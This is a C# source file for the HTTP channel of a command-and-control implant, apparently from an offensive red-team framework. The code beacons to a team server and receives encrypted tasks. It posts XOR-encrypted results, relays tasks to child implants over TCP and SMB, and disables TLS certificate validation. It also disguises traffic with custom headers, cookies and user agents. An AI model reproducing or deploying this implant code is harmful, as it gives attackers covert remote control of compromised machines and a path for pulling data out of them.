using Engineer.Functions;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using DynamicEngLoading;
using System.Reflection;
using System.Security.Policy;

namespace Engineer.Models
{
    public class EngHttpComm : EngCommBase
    {
        public string ConnectAddress { get; set; }
        public int ConnectPort { get; set; }
        public bool IsSecure { get; set; }
        public int ConnectionAttempts { get; set; }

        public List<string> Urls { get; set; }

        public List<string> EventUrls { get; set; } //url for events to post to

        public List<string> Cookies { get; set; }
        public List<string> RequestHeaders { get; set; } //headers on the implant
        public string UserAgent { get; set; }

        public X509Certificate2 Cert { get; set; }

        public static Dictionary<string, string> ChildEngineers { get; set; } = new Dictionary<string, string>();

        private CancellationTokenSource _tokenSource = new CancellationTokenSource();
        protected internal HttpClient _client;
        protected internal HttpClientHandler _handler;

        public EngHttpComm(string connectAddress, int connectPort, string isSecure, int connectionAttempts, int sleep, List<string> urls, List<string> eventurls, List<string> cookies, List<string> requestHeades, string useragent)
        {
            ConnectAddress = connectAddress;
            ConnectPort = connectPort;
            ConnectionAttempts = connectionAttempts;
            Sleep = sleep * 1000; // multiply by 1000 to convert to milliseconds , uses commModule so I dont have ot recreate for other types 
            if (isSecure.ToLower() == "true")
            {
                IsSecure = true;
            }
            else
            {
                IsSecure = false;
            }
            //split the urls, cookies, requestheaders, and responseheaders at the , to make items to add to the lists
            Urls = urls;
            EventUrls = eventurls;
            Cookies = cookies;
            RequestHeaders = requestHeades;
            UserAgent = useragent;
        }

        public override async Task CheckIn()
        {
            try
            {
                //pick one of the strings in the Urls list and use it for the request
                string url = Urls[new Random().Next(Urls.Count)];
                #if DEBUG
                Console.WriteLine("Checking in with " + _client.BaseAddress + url);
                #endif
                // gets anything waiting at the manager for us to read, when this happens it triggers the HandleImplant in our TS
                HttpResponseMessage response = null;
                try
                {
                    response = await _client.GetAsync(url);
                }
                catch (Exception e)
                {
                    if (e is HttpRequestException)
                    {
                        response = await HandleConnectionFailure(url, "get");
                    }
                    Console.WriteLine(e);
                }
                if (response.StatusCode != HttpStatusCode.NoContent)
                {
                    var EncresponseContent = await response.Content.ReadAsByteArrayAsync();
                    await HandleResponse(EncresponseContent);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        public override async Task PostData()
        {
            try
            {
                string url = Urls[new Random().Next(Urls.Count)];
                var outbound = GetOutbound().JsonSerialize(); // serialize the list into a byte array
                // encrypt the byte array with final message key
                byte[] bytesToSend = Encryption.Xor(outbound, Program.MessagePathKey);
                var EncryptedoutboundContent = new ByteArrayContent(bytesToSend);
                HttpResponseMessage response = null;
                try
                {
                    response = await _client.PostAsync(url, EncryptedoutboundContent);
                }
                catch (Exception e)
                {
                    if(e is HttpRequestException)
                    {
                        response = await HandleConnectionFailure(url, "post", bytesToSend);
                    }
                    Console.WriteLine(e);
                    
                }
                if (response.StatusCode != HttpStatusCode.NoContent)
                {
                    var EncresponseContent = await response.Content.ReadAsByteArrayAsync();
                    await HandleResponse(EncresponseContent);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        //used by the http parent to send data for child engineers to the teamserver
        public async Task Postp2pData()
        {
            try
            {
                string url = Urls[new Random().Next(Urls.Count)];
                //already has the encryption and seralization 
                List<byte[]> Encryptedoutbound = GetP2POutbound();
                //turn the encrypted byte array into HttpContent
                //join all the items in the list into one byte array
                byte[] bytesToSend = Encryptedoutbound.Aggregate((x, y) => x.Concat(y).ToArray());
                var EncryptedoutboundContent = new ByteArrayContent(bytesToSend);
                HttpResponseMessage response = null;
                try
                {
                    response = await _client.PostAsync(url, EncryptedoutboundContent);
                }
                catch (Exception e)
                {
                    if (e is HttpRequestException)
                    {
                        response = await HandleConnectionFailure(url, "post", bytesToSend);
                    }
                    Console.WriteLine(e);
                }
                if (response.StatusCode != HttpStatusCode.NoContent)
                {
                    var EncresponseContent = await response.Content.ReadAsByteArrayAsync();
                    await HandleResponse(EncresponseContent);
                }
            }
            catch (Exception e)
            {
                #if DEBUG
                Console.WriteLine(e.Message);
                #endif
            }
        }

        private async Task<HttpResponseMessage> HandleConnectionFailure(string url,string connectionMethod, byte[] dataToSend = null)
        {
            for (int i = 0; i < ConnectionAttempts; i++)
            {
                #if DEBUG
                Console.WriteLine("Attempting to reconnect");
                #endif
                //sleep for a bit before trying to reconnect
                if (Program.Sleeptype == SleepTypes.Custom_RC4)
                {
                    //make sure the SleepEncrypt class is loaded, we can use the custom Module attribute
                    if (Program.typesWithModuleAttribute.Any(attr => attr.Name.Equals("SleepEncrypt", StringComparison.OrdinalIgnoreCase)))
                    {
                        //if we did not recvData and we have no data to send sleep for a bit
                        var sleepEncryptModule = Program.typesWithModuleAttribute.ToList().Find(x => x.Name.Equals("SleepEncrypt", StringComparison.OrdinalIgnoreCase));
                        // Get the method
                        var method = sleepEncryptModule.GetMethod("ExecuteSleep", BindingFlags.Public | BindingFlags.Static);
                        // Call the method , first argument is null because it's a static method
                        method?.Invoke(null, new object[] { EngCommBase.Sleep });
                    }
                    else
                    {
                        Thread.Sleep(EngCommBase.Sleep);
                    }
                }
                else if (Program.Sleeptype == SleepTypes.None)
                {
                    Thread.Sleep(EngCommBase.Sleep);
                }
                //retry the connection
                HttpResponseMessage httpResponseMessage = null;
                if (connectionMethod.Equals("get", StringComparison.CurrentCultureIgnoreCase))
                {
                    httpResponseMessage = await _client.GetAsync(url, HttpCompletionOption.ResponseContentRead);
                }
                else if(connectionMethod.Equals("post", StringComparison.CurrentCultureIgnoreCase))
                {
                    var EncryptedoutboundContent = new ByteArrayContent(dataToSend);
                    httpResponseMessage = await _client.PostAsync(url, EncryptedoutboundContent);
                }
                //if the message is a success then return true and the response
                if (httpResponseMessage.IsSuccessStatusCode)
                {
                    return httpResponseMessage;
                }
                //if we have tried all of the connection attempts and still have not connected then exit
                if (i >= ConnectionAttempts)
                {
                    Environment.Exit(0);
                }
            }
            //we should never get here but if we do return null
            return null;
        }

        private async Task HandleResponse(byte[] EncryptedresponseBytes)
        {
            if(EncryptedresponseBytes == null || EncryptedresponseBytes.Length < 1)
            {
                return;
            }
            try
            {
                Console.WriteLine($"Got response from manager, trying to decrypt with key {Program.MessagePathKey}");
                var DecryptedTaskMessage = Encryption.Xor(EncryptedresponseBytes, Program.MessagePathKey);
                var C2MessageList = DecryptedTaskMessage.JsonDeserialize<List<C2Message>>();
                #if DEBUG
                Console.WriteLine("C2Message deserialized");
                #endif
                foreach (C2Message _c2message in C2MessageList)
                {
                    if (_c2message.PathMessage.Count() == 1 && _c2message.Data != null)
                    {
                        Console.WriteLine($"Using {Program.UniqueTaskKey} to decrypt task");
                        var decryptedMessageContent = Encryption.AES_Decrypt(_c2message.Data, "", Program.UniqueTaskKey);
                        #if DEBUG
                        Console.WriteLine($"Task decrypted");
                        #endif
                        if (_c2message.MessageType is 1 && decryptedMessageContent != null)
                        {
                            HandleTaskingResponse(decryptedMessageContent);
                        }
                        else if (_c2message.MessageType is 2 && decryptedMessageContent != null)
                        {
                            await ProcessInboundNotif(decryptedMessageContent);
                        }
                    }
                    else
                    {
                        //read the path and see if it is a child engineer and forward it on.
                        _c2message.PathMessage.RemoveAt(0);
                        string dest = _c2message.PathMessage[0];
                        // Console.WriteLine($"{DateTime.UtcNow} got task for child {dest}");
                        var serializedTaskMessage = _c2message.JsonSerialize();
                        var EncryptedTaskMessage = Encryption.Xor(serializedTaskMessage, Program.MessagePathKey);

                        //find the dest key in the EngTCPComm.ParentToChildData or EngSMBComm.ParentToChildData and add the task to the queue
                        if (EngTCPComm.ParentToChildData.ContainsKey(dest))
                        {
                            EngTCPComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
                        }
                        else if (EngSMBComm.ParentToChildData.ContainsKey(dest))
                        {
                            EngSMBComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }


        private bool HandleTaskingResponse(byte[] response) //if not null we have stuff to do 
        {
            var tasks = response.JsonDeserialize<List<EngineerTask>>();

            if (tasks != null && tasks.Any())
            {
                foreach (var task in tasks)
                {
                    InboundTasks.Enqueue(task);
                }
                return true;
            }
            return false;
        }

        private async Task ProcessInboundNotif(byte[] response)
        {
            var notifs = response.JsonDeserialize<List<AssetNotification>>();
            if (notifs != null && notifs.Any())
            {
                foreach (var notif in notifs)
                {
                    InboundNotifs.Enqueue(notif);
                }
            }
        }

        public override async Task Start()
        {
        }

        public override void Stop()
        {
            _tokenSource.Cancel();
        }

        public override void Init(EngineerMetadata engineermetadata)
        {
            try
            {
                base.Init(engineermetadata); // base is our parent implementatin in CommModule

                _client = new HttpClient();
                _client.DefaultRequestHeaders.Clear();
                //if IsSecure is true, we need to set the BaseAddress to https:// and use TLS 1.2 for communication
                if (IsSecure)
                {
                    //get the certificate from the certificate path and password, make it useable by the client so it can connect to the server
                    _handler = new HttpClientHandler
                    {
                        ClientCertificateOptions = ClientCertificateOption.Automatic,
                        SslProtocols = SslProtocols.Tls12,
                    };
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                    ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
                    {
                        //ignore all errors for the moment to test if it will even connect back
                        if (errors != SslPolicyErrors.None)
                        {
                            return true;
                        }
                        else if (errors == SslPolicyErrors.None)
                        {
                            return true;
                        }

                        //print the errors
                        foreach (var error in errors.ToString().Split(','))
                        {
                            //Console.WriteLine(error);
                        }
                        return false;

                    };

                    _client = new HttpClient(_handler);
                    _client.BaseAddress = new Uri("https://" + ConnectAddress + ":" + ConnectPort);

                }
                else
                {
                    _client.BaseAddress = new Uri("http://" + ConnectAddress + ":" + ConnectPort);
                }
                //Console.WriteLine($"metadata encryption key is {Program.MetadataKey}");
                byte[] encrypted_metadata = Encryption.AES_Encrypt(engineerMetadata.JsonSerialize(), Program.MetadataKey);
                byte[] implant_name_bytes = Encoding.UTF8.GetBytes(Program.ImplantType);
                byte[] implant_name_length = BitConverter.GetBytes(implant_name_bytes.Length);
                //concatenate the byte arrays so it looks like length:encrypted_implant_name:encrypted_metadata
                byte[] final_metadata = implant_name_length.Concat(implant_name_bytes).Concat(encrypted_metadata).ToArray();
                // returns a base64 encoded string of AES encvrypted serilized json data
                var encodedMetadata = Convert.ToBase64String(final_metadata); 
                _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encodedMetadata}");
                foreach (string header in RequestHeaders)
                {
                    //split the header string at the first index of VALUE so the name is everything to the left of the VALUE and the value is everything to the right of the VALUE
                    var headerName = header.Substring(0, header.IndexOf(","));
                    var headerValue = header.Substring(header.IndexOf(",") + 1);

                    _client.DefaultRequestHeaders.Add($"{headerName}", $"{headerValue}");
                }
                _client.DefaultRequestHeaders.Add("Cookie", Cookies);
                _client.DefaultRequestHeaders.UserAgent.ParseAdd(UserAgent);
            }
            catch (Exception ex)
            {
                //Console.WriteLine(ex.Message);
                //Console.WriteLine(ex.StackTrace);
            }

        }
    }
}
